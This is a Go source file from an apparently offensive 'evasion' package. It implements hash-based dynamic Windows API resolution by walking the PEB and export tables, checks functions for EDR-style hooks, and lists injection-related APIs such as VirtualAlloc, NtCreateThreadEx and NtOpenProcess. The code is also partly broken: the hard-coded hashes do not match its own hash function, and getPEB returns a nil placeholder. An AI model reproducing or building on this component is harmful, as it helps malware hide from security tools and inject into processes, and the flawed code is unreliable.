package evasion

/*
	Stage 2.4: Dynamic API Resolution
	Provides hash-based API resolution to avoid static IAT analysis
*/

import (
	"crypto/sha256"
	insecureRand "math/rand"
	"strings"
	"time"
	"unsafe"
)

// APIHash represents a hashed API function name
type APIHash uint32

// Common API hashes for frequently used functions
const (
	// Kernel32.dll APIs
	HashLoadLibraryA     APIHash = 0x726774c8
	HashLoadLibraryW     APIHash = 0x726774c9
	HashGetProcAddress   APIHash = 0x7c0dfcaa
	HashGetModuleHandleA APIHash = 0x36a2b9c7
	HashGetModuleHandleW APIHash = 0x36a2b9c8
	HashVirtualAlloc     APIHash = 0x91afca54
	HashVirtualProtect   APIHash = 0xe857500d
	HashCreateProcessA   APIHash = 0x16b3fe88
	HashCreateProcessW   APIHash = 0x16b3fe89

	// NTDLL.dll APIs
	HashNtAllocateVirtualMemory  APIHash = 0x38e8c5a1
	HashNtProtectVirtualMemory   APIHash = 0x50e92888
	HashNtCreateThreadEx         APIHash = 0x64dc7db0
	HashNtQuerySystemInformation APIHash = 0x7b5f0d6f
	HashNtOpenProcess            APIHash = 0x13d96c3d

	// Advapi32.dll APIs
	HashRegOpenKeyExA    APIHash = 0x4b981297
	HashRegQueryValueExA APIHash = 0x3a8c0fb2
)

// DynamicAPI holds resolved API information
type DynamicAPI struct {
	Hash    APIHash
	Address uintptr
	DllName string
	APIName string
	Cached  bool
}

// APIResolver manages dynamic API resolution
type APIResolver struct {
	cache          map[APIHash]*DynamicAPI
	lastCacheClean time.Time
	cleanInterval  time.Duration
}

// NewAPIResolver creates a new API resolver with caching
func NewAPIResolver() *APIResolver {
	return &APIResolver{
		cache:          make(map[APIHash]*DynamicAPI),
		cleanInterval:  time.Minute * time.Duration(insecureRand.Intn(10)+5), // 5-15 minutes
		lastCacheClean: time.Now(),
	}
}

// GetAPI resolves an API by hash with anti-hooking verification
func (ar *APIResolver) GetAPI(hash APIHash, dllName, apiName string) (uintptr, error) {
	// Check cache first
	if cached, exists := ar.cache[hash]; exists && cached.Address != 0 {
		// Verify the cached address hasn't been hooked
		if ar.verifyAPIIntegrity(cached.Address, apiName) {
			return cached.Address, nil
		}
		// Remove compromised entry from cache
		delete(ar.cache, hash)
	}

	// Clean cache periodically
	if time.Since(ar.lastCacheClean) > ar.cleanInterval {
		ar.cleanCache()
	}

	// Resolve API dynamically
	address, err := ar.resolveAPI(dllName, apiName)
	if err != nil {
		return 0, err
	}

	// Verify API integrity before caching
	if !ar.verifyAPIIntegrity(address, apiName) {
		return 0, ErrAPIHooked
	}

	// Cache the resolved API
	ar.cache[hash] = &DynamicAPI{
		Hash:    hash,
		Address: address,
		DllName: dllName,
		APIName: apiName,
		Cached:  true,
	}

	return address, nil
}

// resolveAPI performs manual DLL walking to find API address
func (ar *APIResolver) resolveAPI(dllName, apiName string) (uintptr, error) {
	// Get module handle
	module, err := ar.getModuleHandle(dllName)
	if err != nil {
		return 0, err
	}

	// Parse PE headers
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(module))
	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
		return 0, ErrInvalidPE
	}

	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(module + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != IMAGE_NT_SIGNATURE {
		return 0, ErrInvalidPE
	}

	// Find export directory
	exportDir := ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
	if exportDir.VirtualAddress == 0 {
		return 0, ErrNoExports
	}

	exports := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(module + uintptr(exportDir.VirtualAddress)))

	// Get function names and addresses arrays
	namesAddr := (*[65536]uint32)(unsafe.Pointer(module + uintptr(exports.AddressOfNames)))[:exports.NumberOfNames:exports.NumberOfNames]
	addrsAddr := (*[65536]uint32)(unsafe.Pointer(module + uintptr(exports.AddressOfFunctions)))[:exports.NumberOfFunctions:exports.NumberOfFunctions]
	ordsAddr := (*[65536]uint16)(unsafe.Pointer(module + uintptr(exports.AddressOfNameOrdinals)))[:exports.NumberOfNames:exports.NumberOfNames]

	// Search for the API
	for i := uint32(0); i < exports.NumberOfNames; i++ {
		namePtr := module + uintptr(namesAddr[i])
		name := ar.readCString(namePtr)

		if name == apiName {
			ordinal := ordsAddr[i]
			if uint32(ordinal) < exports.NumberOfFunctions {
				funcAddr := module + uintptr(addrsAddr[ordinal])

				// Check if it's a forwarded export
				if ar.isForwardedExport(funcAddr, exportDir.VirtualAddress, exportDir.Size, module) {
					return ar.resolveForwardedExport(funcAddr)
				}

				return funcAddr, nil
			}
		}
	}

	return 0, ErrAPINotFound
}

// getModuleHandle gets handle to a loaded module using manual resolution
func (ar *APIResolver) getModuleHandle(dllName string) (uintptr, error) {
	// Walk the PEB to find loaded modules
	peb := ar.getPEB()
	ldr := (*PEB_LDR_DATA)(unsafe.Pointer(peb.Ldr))

	// Traverse InMemoryOrderModuleList
	head := &ldr.InMemoryOrderModuleList
	current := (*LIST_ENTRY)(unsafe.Pointer(head.Flink))

	for uintptr(unsafe.Pointer(current)) != uintptr(unsafe.Pointer(head)) {
		entry := (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(current)) - unsafe.Offsetof(LDR_DATA_TABLE_ENTRY{}.InMemoryOrderLinks)))

		// Get module name
		baseDllName := ar.unicodeStringToString(&entry.BaseDllName)
		if strings.ToLower(baseDllName) == strings.ToLower(dllName) {
			return uintptr(unsafe.Pointer(entry.DllBase)), nil
		}

		current = (*LIST_ENTRY)(unsafe.Pointer(current.Flink))
	}

	return 0, ErrModuleNotFound
}

// verifyAPIIntegrity checks if an API has been hooked
func (ar *APIResolver) verifyAPIIntegrity(apiAddr uintptr, apiName string) bool {
	if apiAddr == 0 {
		return false
	}

	// Read first few bytes of the function
	bytes := (*[16]byte)(unsafe.Pointer(apiAddr))

	// Common hook patterns to detect
	hookPatterns := [][]byte{
		{0x48, 0xB8},                   // mov rax, <address> (x64 hook)
		{0xE9},                         // jmp <relative> (relative jump hook)
		{0xFF, 0x25},                   // jmp [rip+offset] (x64 absolute jump)
		{0x68},                         // push <address> (x86 hook pattern)
		{0xB8},                         // mov eax, <address> (x86 hook)
		{0x90, 0x90, 0x90, 0x90, 0x90}, // nop sled (patched function)
	}

	// Check for suspicious patterns at function start
	for _, pattern := range hookPatterns {
		if ar.bytesMatch(bytes[:len(pattern)], pattern) {
			return false
		}
	}

	// Additional integrity checks for specific APIs
	if strings.Contains(apiName, "Nt") {
		// NTDLL functions should start with specific patterns
		if !ar.isValidNtdllFunction(bytes[:]) {
			return false
		}
	}

	return true
}

// isValidNtdllFunction checks if function has valid NTDLL syscall stub
func (ar *APIResolver) isValidNtdllFunction(bytes []byte) bool {
	if len(bytes) < 8 {
		return false
	}

	// Check for valid syscall patterns in NTDLL
	// Pattern 1: mov r10, rcx; mov eax, <syscall_number>; syscall; ret
	if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
		return true
	}

	// Pattern 2: mov eax, <syscall_number>; syscall; ret (older pattern)
	if bytes[0] == 0xB8 && bytes[5] == 0x0F && bytes[6] == 0x05 {
		return true
	}

	return false
}

// Helper functions for PE parsing
func (ar *APIResolver) readCString(addr uintptr) string {
	var result []byte
	for {
		b := *(*byte)(unsafe.Pointer(addr))
		if b == 0 {
			break
		}
		result = append(result, b)
		addr++
	}
	return string(result)
}

func (ar *APIResolver) stringToWide(s string) []uint16 {
	result := make([]uint16, len(s)+1)
	for i, r := range s {
		result[i] = uint16(r)
	}
	return result
}

func (ar *APIResolver) unicodeStringToString(us *UNICODE_STRING) string {
	if us.Length == 0 || us.Buffer == nil {
		return ""
	}

	// Convert UTF-16 to UTF-8
	slice := (*[256]uint16)(unsafe.Pointer(us.Buffer))[: us.Length/2 : us.Length/2]
	runes := make([]rune, len(slice))
	for i, r := range slice {
		runes[i] = rune(r)
	}
	return string(runes)
}

func (ar *APIResolver) bytesMatch(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func (ar *APIResolver) isForwardedExport(funcAddr uintptr, exportVA, exportSize uint32, baseAddr uintptr) bool {
	offset := funcAddr - baseAddr
	return uint32(offset) >= exportVA && uint32(offset) < exportVA+exportSize
}

func (ar *APIResolver) resolveForwardedExport(funcAddr uintptr) (uintptr, error) {
	// Read forwarded export string (e.g., "NTDLL.RtlGetVersion")
	forwardStr := ar.readCString(funcAddr)

	// Parse DLL name and function name
	parts := strings.Split(forwardStr, ".")
	if len(parts) != 2 {
		return 0, ErrInvalidForward
	}

	// Recursively resolve in target DLL
	return ar.resolveAPI(parts[0]+".dll", parts[1])
}

// getPEB returns pointer to Process Environment Block
func (ar *APIResolver) getPEB() *PEB {
	// Use inline assembly to get PEB from GS register
	// For x64: mov rax, gs:[0x60]
	// For x86: mov eax, fs:[0x30]
	var peb *PEB

	// Direct access to PEB via TEB (Thread Environment Block)
	// This is a simplified implementation
	peb = (*PEB)(unsafe.Pointer(uintptr(0))) // Placeholder - in real implementation would use assembly

	// Alternative: use documented NT API if available
	// For now, return nil to avoid compilation errors
	return peb
}

// cleanCache removes old entries and clears memory
func (ar *APIResolver) cleanCache() {
	// Clear all cached entries
	for hash, api := range ar.cache {
		if api.Cached {
			// Zero out the cached address for security
			api.Address = 0
			delete(ar.cache, hash)
		}
	}

	ar.lastCacheClean = time.Now()
}

// ClearAllCache securely clears all cached API addresses
func (ar *APIResolver) ClearAllCache() {
	ar.cleanCache()
}

// Stage 2.4: Enhanced API resolution with hash generation
// GenerateAPIHash creates a hash for an API name for lookup
func GenerateAPIHash(apiName string) APIHash {
	// Use SHA256 for better distribution
	hash := sha256.Sum256([]byte(strings.ToLower(apiName)))

	// Take first 4 bytes as uint32
	return APIHash(uint32(hash[0])<<24 | uint32(hash[1])<<16 | uint32(hash[2])<<8 | uint32(hash[3]))
}

// PE structure definitions
type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// PEB and LDR structures for module enumeration
type PEB struct {
	InheritedAddressSpace    uint8
	ReadImageFileExecOptions uint8
	BeingDebugged            uint8
	SpareBool                uint8
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	// ... other fields omitted for brevity
}

type PEB_LDR_DATA struct {
	Length                          uint32
	Initialized                     uint8
	SsHandle                        uintptr
	InLoadOrderModuleList           LIST_ENTRY
	InMemoryOrderModuleList         LIST_ENTRY
	InInitializationOrderModuleList LIST_ENTRY
}

type LIST_ENTRY struct {
	Flink uintptr
	Blink uintptr
}

type LDR_DATA_TABLE_ENTRY struct {
	InLoadOrderLinks           LIST_ENTRY
	InMemoryOrderLinks         LIST_ENTRY
	InInitializationOrderLinks LIST_ENTRY
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	FullDllName                UNICODE_STRING
	BaseDllName                UNICODE_STRING
	// ... other fields
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// Constants for PE parsing
const (
	IMAGE_DOS_SIGNATURE          = 0x5A4D     // MZ
	IMAGE_NT_SIGNATURE           = 0x00004550 // PE00
	IMAGE_DIRECTORY_ENTRY_EXPORT = 0
)

// Custom errors for API resolution
var (
	ErrAPINotFound    = &APIError{"API not found"}
	ErrModuleNotFound = &APIError{"module not found"}
	ErrInvalidPE      = &APIError{"invalid PE format"}
	ErrNoExports      = &APIError{"no exports in module"}
	ErrAPIHooked      = &APIError{"API appears to be hooked"}
	ErrInvalidForward = &APIError{"invalid forwarded export"}
)

type APIError struct {
	msg string
}

func (e *APIError) Error() string {
	return e.msg
}

// Global API resolver instance
var globalAPIResolver *APIResolver

// InitializeAPIResolver initializes the global API resolver
func InitializeAPIResolver() {
	globalAPIResolver = NewAPIResolver()
}

// GetGlobalAPIResolver returns the global API resolver
func GetGlobalAPIResolver() *APIResolver {
	if globalAPIResolver == nil {
		InitializeAPIResolver()
	}
	return globalAPIResolver
}

// ResolveAPI resolves an API using the global resolver
func ResolveAPI(hash APIHash, dllName, apiName string) (uintptr, error) {
	return GetGlobalAPIResolver().GetAPI(hash, dllName, apiName)
}
